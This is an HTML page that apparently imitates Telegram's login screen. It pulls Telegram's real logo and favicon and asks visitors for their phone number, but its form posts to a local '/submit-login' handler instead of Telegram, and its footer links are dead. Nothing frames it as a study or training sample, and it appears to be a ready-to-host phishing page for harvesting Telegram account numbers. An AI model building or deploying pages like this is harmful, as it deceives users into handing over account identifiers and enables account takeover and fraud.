<!DOCTYPE html>
<html>
<head>
    <title>Telegram - Login</title>
    <link rel="icon" href="https://telegram.org/img/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 350px;
        }
        .login-container h2 {
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
        }
        .login-container .logo {
            width: 80px;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
        }
        .input-group input {
            width: calc(100% - 20px);
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .input-group input:focus {
            border-color: #007bff;
            outline: none;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #0056b3;
        }
        .footer-links {
            margin-top: 25px;
            font-size: 14px;
        }
        .footer-links a {
            color: #007bff;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="logo">
        <h2>Sign in to Telegram</h2>
        <form action="/submit-login" method="POST">
            <div class="input-group">
                <label for="phone">Your Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="+1 234 567 8900" required>
            </div>
            <button type="submit">Next</button>
        </form>
        <div class="footer-links">
            <a href="#">About Telegram</a>
            <a href="#">Privacy Policy</a>
        </div>
    </div>
</body>
</html>
